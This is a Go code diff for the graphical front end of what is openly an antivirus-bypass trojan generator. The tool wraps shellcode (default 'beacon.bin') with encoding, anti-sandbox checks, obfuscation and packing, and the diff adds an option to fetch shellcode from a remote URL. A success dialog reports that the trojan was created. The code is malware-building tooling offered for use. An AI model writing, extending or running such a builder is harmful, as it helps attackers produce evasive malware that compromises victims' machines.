@@ -16,37 +16,35 @@ import (
 var (
 	infProgress *widget.ProgressBarInfinite
 
-	antisandboxopt = core.Antisandboxopt{
-		Timestart:      false,
-		Ramcheck:       false,
-		Cpunumbercheck: false,
-		Wechatcheck:    false,
-		Disksizecheck:  false,
+	AntiSandboxOpt = core.AntiSandboxOption{
+		TimeStart:      false,
+		RamCheck:       false,
+		CpuNumberCheck: false,
+		WechatCheck:    false,
+		DiskSizeCheck:  false,
 	}
-	buildopt = core.Buildopt{
+	BuildOpt = core.BuildOption{
 		Garble:     false,
 		Upx:        false,
-		Literalobf: false,
-		Seedrandom: false,
+		LiteralObf: false,
+		SeedRandom: false,
 		Race:       false,
-		Hide:       false,
 	}
-	Tmpgopt = core.Gopt{
+	TempOpt = core.Option{
 		Module:            "",
-		Srcfile:           "beacon.bin",
-		Dstfile:           "result.exe",
-		Shellcodeencode:   "",
-		Sgn:               false,
+		SrcFile:           "beacon.bin",
+		DstFile:           "result.exe",
+		ShellcodeEncode:   "",
 		Donut:             false,
-		Fenli:             false,
-		Shellcodelocation: "",
-		Antisandboxopt:    antisandboxopt,
-		Buildopt:          buildopt,
+		Separate:          false,
+		ShellcodeLocation: "",
+		AntiSandboxOpt:    AntiSandboxOpt,
+		BuildOpt:          BuildOpt,
 	}
 )
 
 func BypassAV(win fyne.Window) fyne.CanvasObject {
-	var filesrcName string
+	var fileSrcName string
 	BypassFileEntry := widget.NewEntry()
 	BypassFileEntry.SetText("beacon.bin")
 	BypassFileButton := widget.NewButton("File", func() {
@@ -59,8 +57,8 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 				log.Println("Cancelled")
 				return
 			}
-			//filesrcName = reader.URI().Path()
-			filesrcName = reader.URI().Path()
+			//fileSrcName = reader.URI().Path()
+			fileSrcName = reader.URI().Path()
 			ext := reader.URI().Extension()
 			println(ext)
 			if ext != ".txt" && ext != ".bin" && ext != ".exe" && ext != ".dll" {
@@ -68,16 +66,16 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 				return
 			}
 			if ext == ".exe" || ext == ".dll" {
-				Tmpgopt.Donut = true
+				TempOpt.Donut = true
 			}
-			Tmpgopt.Srcfile = filesrcName
-			BypassFileEntry.SetText(filesrcName)
-			println(Tmpgopt.Donut)
+			TempOpt.SrcFile = fileSrcName
+			BypassFileEntry.SetText(fileSrcName)
+			println(TempOpt.Donut)
 		}, win)
 		//设置默认位置为当前路径
 		pwd, _ := os.Getwd()
-		nowfileURI := storage.NewFileURI(pwd)
-		listerURI, _ := storage.ListerForURI(nowfileURI)
+		nowFileURI := storage.NewFileURI(pwd)
+		listerURI, _ := storage.ListerForURI(nowFileURI)
 		fd.SetLocation(listerURI)
 		fd.Resize(fyne.NewSize(600, 480))
 		//fd.SetFilter(storage.NewExtensionFileFilter([]string{".bin", ".txt", ".exe", ".dll"}))
@@ -102,153 +100,165 @@ func BypassAV(win fyne.Window) fyne.CanvasObject {
 	BypassMixEntry.SetPlaceHolder("Key")
 
 	shellcodeProcess := widget.NewSelect([]string{"xor+hex+base85", "xor+rc4+hex+base85", "rc4+hex+base85"}, func(s string) {
-		Tmpgopt.Shellcodeencode = s
+		TempOpt.ShellcodeEncode = s
 	})
 	shellcodeProcess.PlaceHolder = "Shellcode way"
-	selectLoderEntry := widget.NewSelect(loaderTmp, func(s string) {
-		Tmpgopt.Module = s
+	selectLoaderEntry := widget.NewSelect(loaderTmp, func(s string) {
+		TempOpt.Module = s
 	})
-	selectLoderEntry.PlaceHolder = "Loader type"
+	selectLoaderEntry.PlaceHolder = "Loader type"
 	sandboxType := make([]string, 0)
-	sandboxlist := reflect.TypeOf(antisandboxopt)
-	sandboxlistnum := sandboxlist.NumField()
-	for i := 0; i < sandboxlistnum; i++ {
-		sandboxType = append(sandboxType, sandboxlist.Field(i).Name)
+	sandboxList := reflect.TypeOf(AntiSandboxOpt)
+	sandboxListNum := sandboxList.NumField()
+	for i := 0; i < sandboxListNum; i++ {
+		sandboxType = append(sandboxType, sandboxList.Field(i).Name)
 	}
 
 	fmt.Printf("%v", sandboxType)
-	BypassSanboxNumEntry := widget.NewEntry()
-	BypassSanboxNumEntry.SetPlaceHolder("Sandbox ways")
+	BypassSandboxNumEntry := widget.NewEntry()
+	BypassSandboxNumEntry.SetPlaceHolder("Sandbox ways")
 
 	//建立反沙箱选项的标签
-	sandboxlabel := widget.NewLabel("反  沙  箱  选  项  ：")
+	sandboxLabel := widget.NewLabel("反  沙  箱  选  项  ：")
 	//挨个建立check建立反沙箱选项
 
-	sandboxcheck1 := widget.NewCheck(sandboxType[0], func(b bool) {
-		Tmpgopt.Antisandboxopt.Timestart = b
+	sandboxCheck1 := widget.NewCheck(sandboxType[0], func(b bool) {
+		TempOpt.AntiSandboxOpt.TimeStart = b
 	})
-	sandboxcheck2 := widget.NewCheck(sandboxType[1], func(b bool) {
-		Tmpgopt.Antisandboxopt.Ramcheck = b
+	sandboxCheck2 := widget.NewCheck(sandboxType[1], func(b bool) {
+		TempOpt.AntiSandboxOpt.RamCheck = b
 	})
-	sandboxcheck3 := widget.NewCheck(sandboxType[2], func(b bool) {
-		Tmpgopt.Antisandboxopt.Cpunumbercheck = b
+	sandboxCheck3 := widget.NewCheck(sandboxType[2], func(b bool) {
+		TempOpt.AntiSandboxOpt.CpuNumberCheck = b
 	})
-	sandboxcheck4 := widget.NewCheck(sandboxType[3], func(b bool) {
-		Tmpgopt.Antisandboxopt.Wechatcheck = b
+	sandboxCheck4 := widget.NewCheck(sandboxType[3], func(b bool) {
+		TempOpt.AntiSandboxOpt.WechatCheck = b
 	})
-	sandboxcheck5 := widget.NewCheck(sandboxType[4], func(b bool) {
-		Tmpgopt.Antisandboxopt.Disksizecheck = b
+	sandboxCheck5 := widget.NewCheck(sandboxType[4], func(b bool) {
+		TempOpt.AntiSandboxOpt.DiskSizeCheck = b
 	})
-	sandboxselectall := widget.NewCheck("select all", func(b bool) {
-		sandboxcheck1.SetChecked(b)
-		sandboxcheck2.SetChecked(b)
-		sandboxcheck3.SetChecked(b)
-		sandboxcheck4.SetChecked(b)
-		sandboxcheck5.SetChecked(b)
+	sandboxSelectAll := widget.NewCheck("select all", func(b bool) {
+		sandboxCheck1.SetChecked(b)
+		sandboxCheck2.SetChecked(b)
+		sandboxCheck3.SetChecked(b)
+		sandboxCheck4.SetChecked(b)
+		sandboxCheck5.SetChecked(b)
 	})
-	sandboxV := container.NewGridWithColumns(6, sandboxselectall, sandboxcheck1, sandboxcheck2, sandboxcheck3, sandboxcheck4, sandboxcheck5)
-
-	checkSgn := widget.NewCheck("Sgn", func(on bool) { Tmpgopt.Sgn = on })
-	checkSgn.MinSize()
+	sandboxV := container.NewGridWithColumns(6, sandboxSelectAll, sandboxCheck1, sandboxCheck2, sandboxCheck3, sandboxCheck4, sandboxCheck5)
 
 	//构建编译选项说明
-	buildlabel := widget.NewLabel("编  译  选  项  ：")
-	//buildlabel.Hide()
+	buildLabel := widget.NewLabel("编  译  选  项  ：")
+	//buildLabel.Hide()
 
 	// 构建 build opt 多选框
-	buildcheck1 := widget.NewCheck("Race", func(b bool) {
-		Tmpgopt.Buildopt.Race = b
+	buildCheck1 := widget.NewCheck("Race", func(b bool) {
+		TempOpt.BuildOpt.Race = b
 	})
-	buildcheck2 := widget.NewCheck("Hide", func(b bool) {
-		Tmpgopt.Buildopt.Hide = b
+	buildCheck2 := widget.NewCheck("Hide", func(b bool) {
+		TempOpt.BuildOpt.Hide = b
 	})
-	buildcheck3 := widget.NewCheck("Literalobf", func(b bool) {
-		Tmpgopt.Buildopt.Literalobf = b
+	buildCheck3 := widget.NewCheck("LiteralObf", func(b bool) {
+		TempOpt.BuildOpt.LiteralObf = b
 	})
-	buildcheck4 := widget.NewCheck("randomseed", func(b bool) {
-		Tmpgopt.Buildopt.Seedrandom = b
+	buildCheck4 := widget.NewCheck("randomseed", func(b bool) {
+		TempOpt.BuildOpt.SeedRandom = b
 	})
-	buildcheck3.Hide()
-	buildcheck4.Hide()
+	buildCheck3.Hide()
+	buildCheck4.Hide()
 
 	shellcodeProcess.PlaceHolder = "Shellcode way"
 
 	checkGarble := widget.NewCheck("Garble", func(on bool) {
-		Tmpgopt.Buildopt.Garble = on
+		TempOpt.BuildOpt.Garble = on
 		if on {
-			buildcheck3.Show()
-			buildcheck4.Show()
+			buildCheck3.Show()
+			buildCheck4.Show()
 		} else {
-			buildcheck3.Hide()
-			buildcheck4.Hide()
+			buildCheck3.Hide()
+			buildCheck4.Hide()
 		}
 
 	})
-	//BypassSelectV2 := container.NewHBox(checkSgn, checkGarble)
-	BypassSelectV := container.NewBorder(nil, nil, checkSgn, nil, container.NewGridWithColumns(2, shellcodeProcess, selectLoderEntry))
+
+	BypassSelectV := container.NewBorder(nil, nil, nil, nil, container.NewGridWithColumns(2, shellcodeProcess, selectLoaderEntry))
 	//checkSgn.MinSize()
 
-	buildboxV := container.NewGridWithColumns(5, checkGarble, buildcheck1, buildcheck2, buildcheck3, buildcheck4)
+	buildBoxV := container.NewGridWithColumns(5, checkGarble, buildCheck1, buildCheck2, buildCheck3, buildCheck4)
 	//分离免杀UI设计
-	fenlilocationtext := widget.NewEntry()
-	fenlilocationtext.SetPlaceHolder("分离的shellcode文件")
-	fenlilocationtext.SetText("分离的shellcode文件")
-	fenlilocationlabel := widget.NewLabel("分离的shellcode存放位置")
-	fenlilocation := container.NewBorder(nil, nil, fenlilocationlabel, nil, fenlilocationtext)
-	fenlilocation.Hide()
-	fenlicheck := widget.NewCheck("分离免杀", func(b bool) {
-		Tmpgopt.Fenli = b
+	separateLocationText := widget.NewEntry()
+	separateUrlText := widget.NewEntry()
+
+	separateLocationText.SetPlaceHolder("分离的shellcode文件")
+	separateUrlText.SetPlaceHolder("远程shellcode地址")
+
+	separateLocationText.SetText("code.txt")
+	separateUrlText.SetText("")
+
+	separateLocationLabel := widget.NewLabel("分离的shellcode存放位置")
+	separateUrlLabel := widget.NewLabel("远程shellcode存放URL")
+
+	separateLocation := container.NewBorder(nil, nil, separateLocationLabel, nil, separateLocationText)
+	separateUrl := container.NewBorder(nil, nil, separateUrlLabel, nil, separateUrlText)
+
+	separateLocation.Hide()
+	separateUrl.Hide()
+
+	separateCheck := widget.NewCheck("分离免杀", func(b bool) {
+		TempOpt.Separate = b
 		switch b {
 		case true:
-			fenlilocation.Show()
+			separateLocation.Show()
+			separateUrl.Show()
 		case false:
-			fenlilocation.Hide()
+			separateLocation.Hide()
+			separateUrl.Show()
 		}
 	})
 	//增强功能UI设计
 	//advancedchecklabel := widget.NewLabel("增 强 功 能 ：")
 	//advancedcheck1 := widget.NewCheck("末尾添加垃圾数据过WD", func(b bool) {
-	//	Tmpgopt.Advancedopt.Addextradata = b
+	//	TempOpt.Advancedopt.Addextradata = b
 	//})
 	//advancedcheck2 := widget.NewCheck("unhook", func(b bool) {
-	//	Tmpgopt.Advancedopt.Unhook = b
+	//	TempOpt.Advancedopt.Unhook = b
 	//})
 	//advancedcheck3 := widget.NewCheck("gate", func(b bool) {
-	//	Tmpgopt.Advancedopt.Gate = b
+	//	TempOpt.Advancedopt.Gate = b
 	//})
 	//advancedgroup := container.NewGridWithColumns(3, advancedcheck1, advancedcheck2, advancedcheck3)
 
 	//生成按钮设计
 	BypassStartButton := widget.NewButton("<<<<<<< Create >>>>>>>", func() {
-		if Tmpgopt.Module == "" || Tmpgopt.Shellcodeencode == "" {
+		if TempOpt.Module == "" || TempOpt.ShellcodeEncode == "" {
 			dialog.ShowInformation("Error！", "请至少选择shellcode加密方式和loader的模组", win)
 			return
 		}
 		infProgress.Start()
-		Tmpgopt.Dstfile = TrojanNameEntry.Text
-		Tmpgopt.Shellcodelocation = fenlilocationtext.Text
-		Startway()
+		TempOpt.DstFile = TrojanNameEntry.Text
+		TempOpt.ShellcodeLocation = separateLocationText.Text
+		TempOpt.ShellcodeUrl = separateUrlText.Text
+		StartWay()
 		infProgress.Stop()
 		dialog.ShowInformation("success!", "木马生成成功！检查当前目录下"+TrojanNameEntry.Text, win)
 	})
 	return container.NewVBox(
 		SelectFileV,
 		TrojanFileV,
-		fenlicheck,
-		fenlilocation,
+		separateCheck,
+		separateLocation,
+		separateUrl,
 		BypassSelectV,
 		//BypassSelectV2,
-		sandboxlabel,
+		sandboxLabel,
 		sandboxV,
-		buildlabel,
-		buildboxV,
-		//advancedchecklabel,
+		buildLabel,
+		buildBoxV,
+		//advancedcheckLabel,
 		//advancedgroup,
 		BypassStartButton,
 		infProgress)
 }
 
-func Startway() {
-	//fmt.Printf("%v", &Tmpgopt)
-	core.Maketrojan(Tmpgopt)
+func StartWay() {
+	core.MakeTrojan(TempOpt)
 }
